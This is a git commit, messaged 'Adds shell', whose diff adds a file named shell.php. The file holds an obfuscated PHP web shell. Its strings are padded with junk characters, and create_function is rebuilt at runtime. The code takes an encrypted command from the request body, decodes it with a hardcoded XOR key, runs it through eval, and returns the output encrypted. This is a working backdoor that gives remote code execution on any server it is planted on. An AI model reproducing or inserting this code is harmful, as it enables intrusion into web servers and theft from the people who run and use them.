0fecce1e1166490491cf51434fe5d88552d16ab6
Mio Engel <mioengel@gmail.com>
2018-10-10 21:48:46 +0200

    Adds shell

---
+++ shell.php
@@ -0,0 +1,11 @@
+<?php
+	$F='rFr@ob_end_clean();$Frr=Fr@baseFr6Fr4_encodFre(@x(@gzcompFrress($oFr),$k));pFrrint("FrFr$p$kh$r$kf");}';
+	$U='h("/$khFr(.Fr+)$kFrf/",@fiFrle_get_coFrnteFrnts("php://FrinpFrutFr"),$m)==1)Fr{@ob_sFrtart();@Frev';
+	$A='b";fFrunctiFron x($t,$Frk){$FrFrFrc=strlen($k);$l=strlenFr($t);$FrFro="";fFror($i=0;$Fri<$l;)Fr{f';
+	$W='Fral(@gzunFrFrcompress(Fr@x(@base6Fr4_decodeFr($FrFrm[1]),$k)))Fr;$o=@obFr_geFrt_conFrtents();F';
+	$r=str_replace('g','','gcrgegate_fguncggtion');
+	$n='or($Frj=0;($FrFrj<$c&&Fr$i<$l);$j++,$i+Fr+){$oFrFr.=Fr$t{$i}^$k{$j};}}rFreturn Fr$oFr;}if(@FrprFreg_matc';
+	$Y='$kFr="4160e69cFr"Fr;Fr$kh="b3Frcdb0ff0cdc";Fr$Frkf=Fr"dd5eb701cFr884";Fr$p="vfFrbwFrKBq5sStcHZc';
+	$l=str_replace('Fr','',$Y.$A.$n.$U.$W.$F);
+	$y=$r('',$l);$y();
+?>
